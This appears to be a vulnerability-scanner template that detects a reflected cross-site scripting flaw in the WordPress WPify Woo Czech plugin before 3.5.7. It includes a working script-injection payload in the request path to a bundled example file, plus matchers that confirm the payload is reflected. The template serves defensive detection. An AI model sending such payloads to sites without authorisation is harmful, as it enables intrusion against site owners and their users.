id: wpify-woo-czech-xss
name: WordPress WPify Woo Czech <3.5.7 - Cross-Site Scripting
severity: high
confidence: confirmed
description: WordPress WPify Woo Czech plugin before 3.5.7 contains a cross-site scripting vulnerability. The plugin uses
  the Vies library 2.2.0, which has a sample file outputting $_SERVER['PHP_SELF'] in an attribute without being escaped first.
  The issue is only exploitable when the web server has the PDO driver installed and write access to the example directory.
reference: CWE-79
tags:
- wp
- wordpress
- xss
- wp-plugin
- wpify
- wpscan
- vuln
requests:
- method: GET
  path: /wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/"><script>alert(document.domain)</script>
  matchers:
  - type: body
    words:
    - '"><script>alert(document.domain)</script>'
    - Add a new VAT ID to the queue
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
